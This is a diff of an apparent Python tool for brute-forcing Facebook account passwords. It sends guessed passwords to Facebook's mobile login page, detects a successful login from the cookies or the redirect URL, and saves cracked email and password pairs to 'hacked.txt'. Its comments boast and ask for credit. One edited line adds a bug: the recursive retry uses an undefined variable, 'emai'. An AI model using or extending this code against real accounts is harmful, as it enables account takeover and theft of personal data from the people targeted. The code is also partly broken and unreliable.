@@ -17,15 +17,15 @@ if sys.version_info[0] != 3:
   sys.exit()
 len_pass=0
 MIN_PASSWORD_LENGTH = 6
-POST_URL = 'https://www.facebook.com/login.php'
-HEADERS = {'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
+POST_URL = 'https://m.facebook.com/login.php'
+HEADERS={'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
 BODY = {}
 COOKIES = {}
 ## ang pag gaya sa code na ito ay hindi magiging dahilan para tawaging kang coder bigyan moko ng credit sa pag gaya mo at matutuwa pako
 ## copying this code will not be a reason to call you a coder give me credit for copying and I'll be happy
 def create_form():
     form = dict()
-    cookies = {'fr': '0IMUuWXccH2pkzP45.AWUFdV5Dgg4VhLNhaLFw5FPobiA.Bid6Iv.mO.AAA.0.0.BigPLT.AWWg4f-WBVM','dpr': '3','locale': 'tl_PH','m_pixel_ratio': '3'}
+    cookies = dict()
     try:
       data = requests.get(POST_URL, headers=HEADERS)
     except:
@@ -58,13 +58,7 @@ def na_hack_naba(email,password):
     except:
       na_hack_naba(email,password)
     try:
-      if "c_user" in r.cookies:
-        open('hacked.txt', 'a').write(str(email+' | '+password))
-        print(65 * '\033[1;92m=')
-        print('\n\033[1;93mPassword found Sir: \033[1;92m'+password+'\n')
-        print(65 * '\033[1;92m=')
-        return True
-      elif len(r.cookies) == 0:
+      if "c_user" in r.cookies or "save-device" in r.url or "home.php" in r.url:
         open('hacked.txt', 'a').write(str(email+' | '+password))
         print(65 * '\033[1;92m=')
         print('\n\033[1;93mPassword found Sir: \033[1;92m'+password+'\n')
@@ -77,7 +71,7 @@ def na_hack_naba(email,password):
         print(65 * '\033[1;92m=')
         return True
     except:
-      na_hack_naba(email,password)
+      na_hack_naba(emai,password)
     return False
 
 def change_ip():
@@ -136,4 +130,4 @@ if __name__ == "__main__":
         len_pass+=1
         print("\033[1;92mTrying password [ "+str(index)+" ]: \033[1;97m"+str(password))
         if na_hack_naba(email,password):
-            break
+          break
